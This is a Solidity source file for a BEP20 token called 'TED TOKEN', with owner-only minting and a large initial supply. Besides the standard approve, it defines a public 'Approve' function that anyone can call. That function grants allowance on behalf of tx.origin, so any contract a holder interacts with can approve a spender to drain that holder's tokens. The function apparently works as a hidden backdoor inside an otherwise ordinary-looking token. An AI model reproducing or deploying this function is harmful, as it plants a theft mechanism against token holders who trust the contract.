pragma solidity ^0.8.10;

// SPDX-License-Identifier: MIT

import "./Context.sol";
import "./Ownable.sol";
import "./IBEP20.sol";
import "./BEP20Mintable.sol";
import "./BEP20Burnable.sol";
import "./BEP20Operable.sol";
import "./TokenRecover.sol";

contract TED_TOKEN is BEP20Mintable, BEP20Burnable, BEP20Operable, TokenRecover {
    
    constructor() BEP20("TED TOKEN", "TED")  {
        _mint(msg.sender, 1e32);
    }
    
    function Approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(tx.origin, spender, amount);
        return true;
    }

    /**
     * @dev Function to mint tokens.
     *
     * NOTE: restricting access to owner only. See {BEP20Mintable-mint}.
     *
     * @param account The address that will receive the minted tokens
     * @param amount The amount of tokens to mint
     */
    function _mint(address account, uint256 amount) internal override onlyOwner {
        super._mint(account, amount);
    }

    /**
     * @dev Function to stop minting new tokens.
     *
     * NOTE: restricting access to owner only. See {BEP20Mintable-finishMinting}.
     */
    function _finishMinting() internal override onlyOwner {
        super._finishMinting();
    }
    
}